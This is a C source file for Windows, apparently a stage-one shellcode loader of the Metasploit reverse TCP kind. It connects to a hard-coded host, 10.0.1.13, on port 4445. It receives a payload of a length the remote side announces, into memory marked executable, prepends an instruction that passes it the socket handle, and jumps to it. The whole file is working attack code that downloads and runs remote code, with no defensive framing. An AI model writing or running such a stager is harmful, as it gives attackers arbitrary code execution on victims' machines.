#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#define IP_ADDRESS "10.0.1.13"
#define PORT 4445
#define BUF_LEN 1024
#define PAYLOAD_SZ 819200

int main() {
  // Initialize Winsock and use version 2.2
  WSADATA wsaData;
  int wResult;
  WSAStartup(MAKEWORD(2,2), &wsaData);
  
  // Create a socket to connect to an IP and port
  SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  // Define socket type, AF_INET (IPv4), IP address, and port.
  struct sockaddr_in saServer;
  saServer.sin_family = AF_INET;
  saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
  saServer.sin_port = htons(PORT);

  // Connect to socket
  printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
  connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );

  // Get payload size
  u_long size = 0;
  recv( ConnectSocket, (char *)&size, 4, 0 );
  printf("Payload size: %d\n", size);
  
  // Receive data from port;
  char buf[BUF_LEN] = "";
  char *rwx = (char *)VirtualAlloc(NULL, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  char *index = rwx;    // Pointer to track position in the payload buffer.
  int res = 0;          // Hold return value of recv().
  int rcvd = 0;         // Track how many bytes we have received. Should match size when done.
  
  // Add assembly to make put our socket in EDI
  index[0] = 0xBF;
  memcpy(index + 1, &ConnectSocket, 4);
  index += 5;
  
  // Receive the payload
  printf("Receiving payload.\n");
  do {
    res = recv( ConnectSocket, index, BUF_LEN, 0 );
    index += res;
    rcvd += res;
  } while (size > rcvd);

  printf("Executing payload.\n");
  // Execute the received payload. Skip the first four bytes, which holds the size of the payload.
  int (*func) ();
  func = (int (*) ()) rwx;
  (int) (*func) (); 
}
